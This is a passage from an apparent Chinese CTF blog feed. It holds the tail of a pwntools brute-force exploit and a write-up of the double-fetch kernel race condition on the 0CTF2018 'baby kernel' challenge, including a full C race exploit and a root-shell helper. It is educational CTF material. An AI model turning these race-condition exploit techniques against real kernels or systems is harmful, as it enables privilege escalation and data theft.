punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#pwn(0,ord('f'))</span>flag<span class="token operator">=</span><span class="token string">''</span>idx<span class="token operator">=</span><span class="token number">0</span>possible_list <span class="token operator">=</span> <span class="token string">"-0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;"</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>left<span class="token punctuation">,</span>right<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>possible_list<span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> right<span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./chall'</span><span class="token punctuation">)</span>ch<span class="token operator">=</span><span class="token builtin">ord</span><span class="token punctuation">(</span>possible_list<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span>ret <span class="token operator">=</span> pwn<span class="token punctuation">(</span>idx<span class="token punctuation">,</span> ch<span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>ret <span class="token operator">!=</span> <span class="token boolean">None</span> <span class="token keyword">and</span> possible_list<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m flag: &#123;&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>idx <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">break</span>                <span class="token keyword">elif</span><span class="token punctuation">(</span>ret <span class="token operator">!=</span> <span class="token boolean">None</span> <span class="token keyword">and</span> possible_list<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'SUCCESS!!!'</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>flag<span class="token operator">+</span><span class="token string">'&#125;'</span><span class="token punctuation">)</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>left<span class="token operator">+=</span><span class="token number">1</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>在本地是能通的，远程好像有问题。比赛中途体测去了回来已有师傅解出</p></blockquote><h2 id="my-qq"><a href="#my-qq" class="headerlink" title="my_qq"></a>my_qq</h2><h3 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h3><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>double fetch</title>
      <link href="/2023/12/24/double%20fetch/"/>
      <url>/2023/12/24/double%20fetch/</url>
      
        <content type="html"><![CDATA[<blockquote><p>通常情况下在用户态下的 pwn 当中我们只有一个独立运行的主线程，并不存在所谓条件竞争的情况，但在 kernel pwn 当中由攻击者负责编写用户态程序，可以很轻易地启动多个线程同时运行，从而轻易地产生条件竞争。<a href="https://www.usenix.org/system/files/conference/usenixsecurity17/sec17-wang.pdf">原论文</a><br>参考文章：<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/race/double-fetch/">Double Fetch - CTF Wiki (ctf-wiki.org)</a><br><a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#double-fetch">【PWN.0x00】Linux Kernel Pwn I：Basic Exploit to Kernel Pwn in CTF - arttnba3’s blog</a></p></blockquote><h1 id="一、原理"><a href="#一、原理" class="headerlink" title="一、原理"></a>一、原理</h1><p><code>Double Fetch</code> 从漏洞原理上属于条件竞争漏洞，是一种内核态与用户态之间的数据访问竞争。</p><p>在 Linux 等现代操作系统中，虚拟内存地址通常被划分为内核空间和用户空间。内核空间负责运行内核代码、驱动模块代码等，权限较高。而用户空间运行用户代码，并通过系统调用进入内核完成相关功能。通常情况下，用户空间向内核传递数据时，内核先通过通过 <code>copy_from_user</code> 等拷贝函数将用户数据拷贝至内核空间进行校验及相关处理，<strong>但在输入数据较为复杂时，内核可能只引用其指针，而将数据暂时保存在用户空间进行后续处理。此时，该数据存在被其他恶意线程篡改风险，造成内核验证通过数据与实际使用数据不一致，导致内核代码执行异常。</strong></p><p>一个典型的 <code>Double Fetch</code> 漏洞原理如下图所示，一个用户态线程准备数据并通过系统调用进入内核，该数据在内核中有两次被取用，内核第一次取用数据进行安全检查（如缓冲区大小、指针可用性等），当检查通过后内核第二次取用数据进行实际处理。而在两次取用数据之间，另一个用户态线程可创造条件竞争，对已通过检查的用户态数据进行篡改，在真实使用时造成访问越界或缓冲区溢出，最终导致内核崩溃或权限提升。</p><p><img src="/Binary_FILE/6d85660472c166f79b1b5e7cfd817980_MD5.jpeg"></p><p>通过在 first fetch 与 second fetch 之间的空挡修改数据从而改变内核执行流的利用手法便被称之为<code>double fetch</code></p><h1 id="二、0CTF2018-Final-baby-kernel"><a href="#二、0CTF2018-Final-baby-kernel" class="headerlink" title="二、0CTF2018 Final - baby kernel"></a>二、0CTF2018 Final - baby kernel</h1><h2 id="一-程序分析"><a href="#一-程序分析" class="headerlink" title="(一)程序分析"></a>(一)程序分析</h2><h2 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">qemu-system-x86_64 <span class="token punctuation">\</span><span class="token parameter variable">-m</span> 256M <span class="token parameter variable">-smp</span> <span class="token number">2</span>,cores<span class="token operator">=</span><span class="token number">2</span>,threads<span class="token operator">=</span><span class="token number">1</span>  <span class="token punctuation">\</span><span class="token parameter variable">-kernel</span> ./vmlinuz-4.15.0-22-generic <span class="token punctuation">\</span><span class="token parameter variable">-initrd</span>  ./core.cpio <span class="token punctuation">\</span><span class="token parameter variable">-append</span> <span class="token string">"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet"</span> <span class="token punctuation">\</span><span class="token parameter variable">-cpu</span> qemu64 <span class="token punctuation">\</span><span class="token parameter variable">-netdev</span> user,id<span class="token operator">=</span>t0, <span class="token parameter variable">-device</span> e1000,netdev<span class="token operator">=</span>t0,id<span class="token operator">=</span>nic0 <span class="token punctuation">\</span><span class="token parameter variable">-nographic</span>  -enable-kvm  <span class="token punctuation">\</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>基本没开什么保护</p><h2 id="core-init"><a href="#core-init" class="headerlink" title="&#x2F;core&#x2F;init"></a>&#x2F;core&#x2F;init</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span> <span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mount</span> <span class="token parameter variable">-t</span> sysfs none /sys<span class="token function">mount</span> <span class="token parameter variable">-t</span> devtmpfs devtmpfs /dev<span class="token builtin class-name">echo</span> <span class="token string">"flag&#123;this_is_a_sample_flag&#125;"</span> <span class="token operator">></span> flag<span class="token function">chown</span> root:root flag<span class="token function">chmod</span> <span class="token number">400</span> flag<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/dev/console<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">1</span>></span>/dev/console<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/consoleinsmod baby.ko<span class="token function">chmod</span> <span class="token number">777</span> /dev/baby<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds<span class="token entity" title="\n">\n</span>"</span>setsid cttyhack setuidgid <span class="token number">1000</span> <span class="token function">sh</span><span class="token function">umount</span> /proc<span class="token function">umount</span> /syspoweroff <span class="token parameter variable">-d</span> <span class="token number">0</span>  <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在&#x2F;dev&#x2F;baby有一个驱动</p><h2 id="baby-ko"><a href="#baby-ko" class="headerlink" title="baby.ko"></a>baby.ko</h2><p><img src="/Binary_FILE/86c4412a35b01465833c8740c52858c2_MD5.jpeg"></p><h3 id="init-module"><a href="#init-module" class="headerlink" title="init_module"></a>init_module</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">init_module</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">_fentry__</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">misc_register</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>baby<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建了一个驱动baby</p><h3 id="baby-ioctl"><a href="#baby-ioctl" class="headerlink" title="baby_ioctl"></a>baby_ioctl</h3><p><img src="/Binary_FILE/eadf383cf8e6cae625207e66cd8edf2d_MD5.jpeg"><br>不难看出我们传入的结构体为：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">v5</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> <span class="token operator">*</span>flag<span class="token punctuation">;</span><span class="token class-name">size_t</span> len<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其中参数 <code>0x6666</code> 可以获得 flag 在内核中的地址，参数 <code>0x1337</code> 则会将我们传入的 flag 与真正的 flag 进行对比，若正确则会将 flag 打印出来<br><img src="/Binary_FILE/eebcbda8ae5b6b515c20e3017fafb6b5_MD5.jpeg"></p><p>主要看打印flag的这个检查，需要<code>_chk_range_not_ok()</code>函数返回值为0：<br><img src="/Binary_FILE/59f16cbe8aad4e8fd08af279bdf46247_MD5.jpeg"></p><p>其中<code>_chk_range_not_ok()</code>如下<br><img src="/Binary_FILE/e097bac6f5c642a14e4b8c5f77a7cb57_MD5.jpeg"></p><ul><li>CF是进位标志，如果运算结果的<strong>最高位</strong>产生了一个进位或错位，那么，其值为1，否则其值为0。在这里我们一般满足</li><li>a3要求小于a1+a2，这个a3是<code>*(__readgsqword(&amp;current_task) + 0x1358)</code>。切root动调看：<br><img src="/Binary_FILE/b805321a5fcf6e3effc02f924b2707f9_MD5.jpeg"><br>可见该值为0x7ffffffff000，正好是用户态的栈底值<br><img src="/Binary_FILE/b240eb23c9676449cc306e4f05fd6dfa_MD5.jpeg"></li></ul><p>综上所述，检查为：</p><ol><li>输入的数据指针是否为用户态数据</li><li>数据指针内的成员flag指针是否指向用户态</li><li>指针指向数据的len是否对于flag长度</li></ol><h2 id="二-EXP"><a href="#二-EXP" class="headerlink" title="(二)EXP"></a>(二)EXP</h2><p>这个驱动似乎没有什么漏洞，但是其中的两个检查是分开的<br><img src="/Binary_FILE/9dd93c0fa6f031532ec84d6e1b89e70b_MD5.jpeg"><br>如果我们在判断flag地址范围和flag内容之间进行竞争，通过第一处检查后就把flag的地址换为内核中真正flag的地址，然后自身与自身比较，通过检查拿到flag。</p><p>攻击思路：</p><ol><li>创建一个竞争线程，不断修改flag.flag_addr为内核flag地址</li><li>循环执行ioctl（事前改flag.flag_addr为用户态地址）</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_sp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>__asm__ <span class="token function">__volatile__</span><span class="token punctuation">(</span><span class="token string">"mov user_cs,cs;"</span><span class="token string">"mov user_ss,ss;"</span><span class="token string">"mov user_sp,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop user_rflags;"</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[+] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">struct</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span> <span class="token operator">*</span>flag_addr<span class="token punctuation">;</span><span class="token class-name">size_t</span> flag_len<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>flag<span class="token punctuation">;</span><span class="token keyword">int</span> status<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token class-name">pthread_t</span> compete_thread<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">competitionThread</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>flag<span class="token punctuation">.</span>flag_addr<span class="token operator">=</span>addr<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/baby"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to open /dev/baby"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0x6666</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"dmesg |grep flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"dmesg |grep flag > ./addr.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//get addr</span><span class="token keyword">int</span> addr_fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"./addr.txt"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>addr_fd<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to open /dev/baby"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x60</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> real_addr<span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span>addr_fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>real_addr<span class="token operator">=</span><span class="token function">strstr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token string">"ff"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>real_addr<span class="token operator">=</span><span class="token function">strtoul</span><span class="token punctuation">(</span>real_addr<span class="token punctuation">,</span>real_addr<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+]real_addr: %p\n"</span><span class="token punctuation">,</span> real_addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//competition</span><span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>compete_thread<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> competitionThread <span class="token punctuation">,</span>real_addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> try_times<span class="token operator">=</span><span class="token number">0x1000</span><span class="token punctuation">;</span>flag<span class="token punctuation">.</span>flag_len<span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>try_times<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>flag<span class="token punctuation">.</span>flag_addr<span class="token operator">=</span><span class="token string">"X1NRI"</span><span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0x1337</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>status<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token function">pthread_cancel</span><span class="token punctuation">(</span>compete_thread<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"dmesg |grep flag&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/Binary_FILE/bf3135c1609351382f4aa65ddebf4bc3_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> Linux Kernel Mode </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF X 0psu3 2023十一月挑战赛</title>
      <link href="/2023/12/11/DASCTF%20X%200psu3%202023%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/"/>
      <url>/2023/12/11/DASCTF%20X%200psu3%202023%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/</url>
      
